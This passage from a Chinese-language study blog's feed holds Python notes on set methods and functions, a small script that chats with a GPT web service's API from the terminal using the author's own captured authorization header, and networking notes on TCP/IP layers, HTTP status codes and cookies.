align="left"><a href="https://www.runoob.com/python3/ref-set-issubset.html">issubset()</a></td><td align="left">判断指定集合是否为该方法参数集合的子集。</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/ref-set-issuperset.html">issuperset()</a></td><td align="left">判断该方法的参数集合是否为指定集合的子集</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/ref-set-pop.html">pop()</a></td><td align="left">随机移除元素</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/ref-set-remove.html">remove()</a></td><td align="left">移除指定元素</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/ref-set-symmetric_difference.html">symmetric_difference()</a></td><td align="left">返回两个集合中不重复的元素集合。</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/ref-set-symmetric_difference_update.html">symmetric_difference_update()</a></td><td align="left">移除当前集合中在另外一个指定集合相同的元素，并将另外一个指定集合中不同的元素插入到当前集合中。</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/ref-set-union.html">union()</a></td><td align="left">返回两个集合的并集</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/ref-set-update.html">update()</a></td><td align="left">给集合添加元素</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/python3-string-len.html">len()</a></td><td align="left">计算集合元素个数</td></tr></tbody></table><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><p>基本结构</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">hello</span>() :</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Hello World!&quot;</span>)</span><br><span class="line"></span><br><span class="line">hello()</span><br></pre></td></tr></table></figure><h1 id="随便写的一个python程序"><a href="#随便写的一个python程序" class="headerlink" title="随便写的一个python程序"></a>随便写的一个python程序</h1><p>抓包某gpt并在终端问答</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(sys.stdout.encoding)</span><br><span class="line"><span class="comment">###########第一次运行后把生成的topicId粘贴在此################################</span></span><br><span class="line">topicId = <span class="number">0</span>     <span class="comment">######################</span></span><br><span class="line"><span class="comment">##########################################</span></span><br><span class="line">host = <span class="string">&quot;api.xiabb.chat&quot;</span></span><br><span class="line">UA = <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">####################抓包并填写自己的Authorization##############</span></span><br><span class="line">Authorization = <span class="string">&quot;example&quot;</span></span><br><span class="line"><span class="comment">##############################################</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sendMessage</span>():</span><br><span class="line"></span><br><span class="line">    url = <span class="string">&quot;https://api.xiabb.chat/chatapi/chat/message&quot;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;Host&quot;</span>: host,</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>: UA,</span><br><span class="line">        <span class="string">&quot;Authorization&quot;</span>: Authorization,</span><br><span class="line">        <span class="string">&quot;Language&quot;</span>: <span class="string">&quot;zh-CN&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;https://ai.xiabb.chat&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;https://ai.xiabb.chat/&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Sec-Fetch-Dest&quot;</span>: <span class="string">&quot;empty&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Sec-Fetch-Mode&quot;</span>: <span class="string">&quot;cors&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Sec-Fetch-Site&quot;</span>: <span class="string">&quot;same-site&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Te&quot;</span>: <span class="string">&quot;trailers&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    msg = <span class="built_in">input</span>(<span class="string">&#x27;msg:&#x27;</span>)</span><br><span class="line">    data = &#123;<span class="string">&quot;topicId&quot;</span>:topicId,</span><br><span class="line">            <span class="string">&quot;messages&quot;</span>:[],</span><br><span class="line">            <span class="string">&quot;content&quot;</span>:msg,</span><br><span class="line">            <span class="string">&quot;contentFiles&quot;</span>:[]</span><br><span class="line">            &#125;</span><br><span class="line">    res = requests.post(url=url, json=data, headers=headers)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;success&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        json_res = res.json()</span><br><span class="line">        messageRes = json_res.get(<span class="string">&quot;result&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(messageRes)</span><br><span class="line">        messageId = messageRes[<span class="number">1</span>]</span><br><span class="line">        <span class="built_in">print</span>(messageId)</span><br><span class="line">        <span class="comment"># options</span></span><br><span class="line">        url = <span class="string">&quot;https://api.xiabb.chat/chatapi/chat/message/&quot;</span> + <span class="built_in">str</span>(messageId)</span><br><span class="line">        opts_headers = &#123;</span><br><span class="line">            <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;*/*&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Access-Control-Request-Method&quot;</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Access-Control-Request-Headers&quot;</span>: <span class="string">&quot;authorization,content-type&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;https://ai.xiabb.chat/&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;https://ai.xiabb.chat&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Sec-Fetch-Dest&quot;</span>: <span class="string">&quot;empty&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Sec-Fetch-Mode&quot;</span>: <span class="string">&quot;cors&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Sec-Fetch-Site&quot;</span>: <span class="string">&quot;same-site&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Te&quot;</span>: <span class="string">&quot;trailers&quot;</span>,</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">print</span>(url)</span><br><span class="line">        opts_res = requests.options(url=url,headers=opts_headers)</span><br><span class="line">        msg_res = requests.post(url,headers=headers)</span><br><span class="line">        <span class="built_in">print</span>(msg_res.content.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;something error in sending messge&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">newTopic</span>():</span><br><span class="line">    url = <span class="string">&quot;https://api.xiabb.chat/chatapi/chat/save&quot;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;Host&quot;</span>: host,</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>: UA,</span><br><span class="line">        <span class="string">&quot;Authorization&quot;</span>: Authorization,</span><br><span class="line">        <span class="string">&quot;Language&quot;</span>: <span class="string">&quot;zh-CN&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;https://ai.xiabb.chat&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;https://ai.xiabb.chat/&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Sec-Fetch-Dest&quot;</span>: <span class="string">&quot;empty&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Sec-Fetch-Mode&quot;</span>: <span class="string">&quot;cors&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Sec-Fetch-Site&quot;</span>: <span class="string">&quot;same-site&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Te&quot;</span>: <span class="string">&quot;trailers&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;id&quot;</span>:<span class="number">0</span>,</span><br><span class="line">        <span class="string">&quot;roleId&quot;</span>:<span class="number">0</span>,</span><br><span class="line">        <span class="string">&quot;title&quot;</span>:<span class="string">&quot;你好&quot;</span>,</span><br><span class="line">        <span class="string">&quot;isLock&quot;</span>:<span class="number">0</span>,</span><br><span class="line">        <span class="string">&quot;systemMessage&quot;</span>:<span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;params&quot;</span>:<span class="string">&quot;&#123;\&quot;model\&quot;:\&quot;gpt-3.5-turbo-16k-0613\&quot;,\&quot;is_webSearch\&quot;:false,\&quot;message\&quot;:[],\&quot;systemMessage\&quot;:null,\&quot;requestMsgCount\&quot;:6,\&quot;temperature\&quot;:0.8,\&quot;max_tokens\&quot;:8192&#125;&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    res = requests.post(headers=headers,url=url,json=data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;success&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        json_res = res.json()</span><br><span class="line">        result = json_res.get(<span class="string">&quot;result&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;it works!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> topicId:</span><br><span class="line">    topicId = newTopic()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;topicId:&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(topicId)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;topicId exist&quot;</span>)</span><br><span class="line">sendMessage()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;python基础&quot;&gt;&lt;a href=&quot;#python基础&quot; class=&quot;headerlink&quot; title=&quot;python基础&quot;&gt;&lt;/a&gt;python基础&lt;/h1&gt;&lt;p&gt;之间也学过一些python编程基础,但大都是零散碎片化的知识&lt;/p&gt;
&lt;p&gt;故在此系统地记录</summary>
      
    
    
    
    <category term="笔记2" scheme="http://example.com/categories/%E7%AC%94%E8%AE%B02/"/>
    
    
    <category term="python" scheme="http://example.com/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>网络基础</title>
    <link href="http://example.com/2024/01/29/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/"/>
    <id>http://example.com/2024/01/29/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/</id>
    <published>2024-01-29T02:18:30.000Z</published>
    <updated>2024-01-29T15:34:01.405Z</updated>
    
    <content type="html"><![CDATA[<h1 id="网络基础"><a href="#网络基础" class="headerlink" title="网络基础"></a>网络基础</h1><h2 id="网络层级结构"><a href="#网络层级结构" class="headerlink" title="网络层级结构"></a>网络层级结构</h2><p>首先就是网络分层了,先上图</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/OSI%E4%B8%8ETCP.webp"></p><p>一般都是按照tcp&#x2F;ip分层来实现网络分层, 也就是 物数网传应 五层模型</p><blockquote><ol><li>应用层</li></ol><p>应用层是我们经常接触使用的部分，比如常用的http协议、ftp协议（文件传输协议）、snmp（网络管理协议）、telnet （远程登录协议 ）、smtp（简单邮件传输协议）、dns（域名解析），这次主要是面向用户的交互的。这里的应用层集成了osi分层模型中 的应用、会话、表示层三层的功能。</p><ol start="2"><li>传输层</li></ol><p>传输层的作用就是将应用层的数据进行传输转运。比如我们常说的tcp（可靠的传输控制协议）、udp（用户数据报协议）。传输单位为报文段。<br>tcp（Transmission Control Protocol） 面向连接（先要和对方确定连接、传输结束需要断开连接，类似打电话）、复杂可靠的、有很好的重传和查错机制。</p><p>一般用与高速、可靠的通信服务udp（user datagram protocol）面向无连接（无需确认对方是否存在，类似寄包裹）、简单高效、没有重传机制。一般用于即时通讯、广播通信等。</p><ol start="3"><li>网络层</li></ol><p>来处理网络中流动的数据包，数据包为最小的传递单位，比如我们常用的ip协议、icmp协议、arp协议（通过分析ip地址得出物理mac地址）。</p><ol start="4"><li>数据链路层</li></ol><p>数据链路层一般用来处理连接硬件的部分，包括控制网卡、硬件相关的设备驱动等。传输单位数据帧。</p><ol start="5"><li>物理层</li></ol><p>物理层一般为负责数据传输的硬件，比如我们了解的双绞线电缆、无线、光纤等。比特流光电等信号发送接收数据。</p></blockquote><p>简而言之, 自顶向下来理解</p><p>__应用层__实现了具体的功能,如 收发邮件, 文件传输等, 对于如何传输, 并不关心</p><p>https, http, ftp, dns…</p><p>__传输层__则实现了如何传输, 如何将庞大的数据分块, 使其能够完整传输出去, 当某一块数据丢失使, 判断是否要对丢失的数据段重传</p><p>tcp, udp…</p><p>__网络层__则是负责数据如何从一端到另一端, 即我们常见的ip协议寻址, 他也会将传输层的数据段分块, 并在每一块前面加上ip包头, 形成ip报文(实际上每一层都会分块并加上自己的包头)</p><p>__数据链路层__并不关心以上任何东西, 他要做的只是实现数据点到点的传输, 例如,从a地到z地, 需要经过b,c,d,e,f… 两点之间如何传输就是在数据链路层上实现的. 工作在此此层级的协议MAC协议,同意会将ip报文分片并加上MAC头部形成MAC帧</p><p><strong>物理层</strong>,显而易见,通过将数据转换为光信号或电信号传输出去</p><h2 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h2><h3 id="一些请求方法"><a href="#一些请求方法" class="headerlink" title="一些请求方法"></a>一些请求方法</h3><p>GET, POST, HEAD, OPTIONS, PUT…</p><h3 id="状态码"><a href="#状态码" class="headerlink" title="状态码"></a>状态码</h3><table><thead><tr><th align="left">分类</th><th align="left">分类描述</th></tr></thead><tbody><tr><td align="left">1**</td><td align="left">信息，服务器收到请求，需要请求者继续执行操作</td></tr><tr><td align="left">2**</td><td align="left">成功，操作被成功接收并处理</td></tr><tr><td align="left">3**</td><td align="left">重定向，需要进一步的操作以完成请求</td></tr><tr><td align="left">4**</td><td align="left">客户端错误，请求包含语法错误或无法完成请求</td></tr><tr><td align="left">5**</td><td align="left">服务器错误，服务器在处理请求的过程中发生了错误</td></tr></tbody></table><h3 id="HTTP-Cookie"><a href="#HTTP-Cookie" class="headerlink" title="HTTP Cookie"></a>HTTP Cookie</h3><blockquote><p>HTTP Cookie（也叫 Web Cookie 或浏览器 Cookie）是服务器发送到用户浏览器并保存在本地的一小块数据。浏览器会存储 cookie 并在下次向同一服务器再发起请求时携带并发送到服务器上。通常，它用于告知服务端两个请求是否来自同一浏览器——如保持用户的登录状态。Cookie 使基于<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Overview#http_%E6%98%AF%E6%97%A0%E7%8A%B6%E6%80%81%EF%BC%8C%E6%9C%89%E4%BC%9A%E8%AF%9D%E7%9A%84">无状态</a>的 HTTP 协议记录稳定的状态信息成为了可能。</p></blockquote><p>服务器向用户发送cookie</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;</span><br></pre></td></tr></table></figure><p>用户携带cookie</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /page.html HTTP/1.1</span><br><span class="line">Host: www.example.org</span><br><span class="line">Cookie: xxxxxx=xxxxxx</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;网络基础&quot;&gt;&lt;a href=&quot;#网络基础&quot; class=&quot;headerlink&quot; title=&quot;网络基础&quot;&gt;&lt;/a&gt;网络基础&lt;/h1&gt;&lt;h2 id=&quot;网络层级结构&quot;&gt;&lt;a href=&quot;#网络层级结构&quot; class=&quot;headerlink&quot; title=&quot;网络层级结</summary>
      
    
    
    
    <category term="笔记2" scheme="http://example.com/categories/%E7%AC%94%E8%AE%B02/"/>
    
    
    <category term="网络基础" scheme="http://example.com/tags/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/"/>
    
  </entry>
  
</feed>
